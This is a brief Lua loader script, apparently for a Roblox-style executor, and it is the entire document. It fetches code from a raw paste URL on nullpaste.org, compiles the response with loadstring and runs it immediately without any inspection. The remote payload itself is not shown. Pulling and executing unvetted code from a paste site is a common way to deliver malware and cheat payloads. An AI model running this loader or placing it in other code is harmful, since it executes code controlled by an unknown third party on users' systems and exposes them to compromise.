scripts.script:
local response = request({
	Url = "https://nullpaste.org/raw/kB_Dx5hpYn4_",
	Method = "GET",
})

if not response.Success then
	return warn("Request failed:", response.StatusCode)
end

local chunk, errorMessage = loadstring(response.Body)
if not chunk then
	return warn(errorMessage)
end

chunk()
